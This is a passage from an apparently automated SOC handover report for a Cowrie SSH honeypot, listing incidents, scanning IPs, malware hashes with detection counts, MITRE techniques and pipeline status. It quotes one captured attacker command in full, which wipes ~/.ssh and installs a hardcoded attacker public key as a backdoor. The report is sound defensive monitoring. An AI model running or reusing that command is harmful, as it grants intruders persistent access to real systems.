| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:18:48` | `cowrie.session.connect` |
| `2026-04-15 19:18:48` | `cowrie.client.version` |
| `2026-04-15 19:18:48` | `cowrie.client.kex` |
| `2026-04-15 19:18:48` | `cowrie.login.success` |
| `2026-04-15 19:18:49` | `cowrie.session.params` |
| `2026-04-15 19:18:49` | `cowrie.command.input` |
| `2026-04-15 19:18:49` | `cowrie.command.failed` |
| `2026-04-15 19:18:49` | `cowrie.log.closed` |
| `2026-04-15 19:18:49` | `cowrie.session.params` |
| `2026-04-15 19:18:49` | `cowrie.command.input` |
| `2026-04-15 19:18:49` | `cowrie.session.file_download` |
| `2026-04-15 19:18:49` | `cowrie.log.closed` |
| `2026-04-15 19:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cea2e15f6a1

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-15 19:18 |
| **Last Seen** | 2026-04-15 19:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:18:52` | `cowrie.session.connect` |
| `2026-04-15 19:18:52` | `cowrie.client.version` |
| `2026-04-15 19:18:52` | `cowrie.client.kex` |
| `2026-04-15 19:18:52` | `cowrie.login.success` |
| `2026-04-15 19:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `220.205.123[.]19` | **27** | 2026-04-15 18:59 | 2026-04-15 19:20 | 48m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `182.79.216[.]98` | **25** | 2026-04-15 17:16 | 2026-04-15 18:03 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `77.87.40[.]114` | **15** | 2026-04-15 19:00 | 2026-04-15 19:23 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `119.145.25[.]87` | **2** | 2026-04-15 17:45 | 2026-04-15 17:47 | 2m | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]59` | **2** | 2026-04-15 17:46 | 2026-04-15 17:48 | 2m | 0 | `T1592` | 🟢 LOW |
| `112.6.227[.]209` | 1 | 2026-04-15 17:20 | 2026-04-15 17:20 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.96.158[.]238` | 1 | 2026-04-15 19:00 | 2026-04-15 19:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.227.31[.]13` | 1 | 2026-04-15 19:01 | 2026-04-15 19:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]22` | 1 | 2026-04-15 19:03 | 2026-04-15 19:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.41.173[.]197` | 1 | 2026-04-15 18:59 | 2026-04-15 19:01 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `119.145.25[.]87` | CN | CHINANET Guangdong province network | **100** ⚠️ | 0 |
| `58.221.60[.]59` | CN | CHINANET jiangsu province network | **100** ⚠️ | 11 |
| `182.79.216[.]98` | IN | BHARTI-AIRTEL | **100** ⚠️ | 1 |
| `220.205.123[.]19` | CN | China Unicom | **100** ⚠️ | 9 |
| `77.87.40[.]114` | UA | Znet | **100** ⚠️ | 50 |
| `112.6.227[.]209` | CN | China Mobile Communications Corporation | **100** ⚠️ | 32 |
| `36.41.173[.]197` | CN | CHINANET SHAANXI PROVINCE NETWORK | **100** ⚠️ | 38 |
| `14.103.114[.]22` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `121.227.31[.]13` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `119.96.158[.]238` | CN | CHINANET Hubei province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 149 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 70 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 52 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 27 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 27 |

---

## 🔕 False Positive Summary (38 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 22 below threshold 25 | 34 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 156 cases |
| Tool 34  | Credential Extractor        | ✅ 123 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 15 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 38 filtered (24.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 12 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 42 priority case(s) shown individually · 10 recon entry/entries in table (5 group(s) consolidating 71 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-15T19:24:41Z_
